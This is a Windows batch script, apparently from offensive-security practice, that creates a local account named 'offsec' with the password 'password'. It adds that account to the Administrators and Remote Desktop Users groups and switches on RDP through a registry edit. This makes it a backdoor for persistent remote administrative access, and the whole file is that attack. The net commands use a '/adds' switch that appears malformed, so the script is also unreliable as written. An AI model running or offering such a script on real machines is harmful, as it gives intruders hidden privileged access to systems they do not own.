@ECHO OFF
:: This batch file adds user to Administrator and enables RDP
Title Add user
echo Adding user...
net user offsec password /adds
net localgroup Administrators offsec /adds
net localgroup "Remote Desktop Users" offsec /adds
ECHO Enabling RDP...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
ECHO ====================
ECHO User added
ECHO ====================
net users

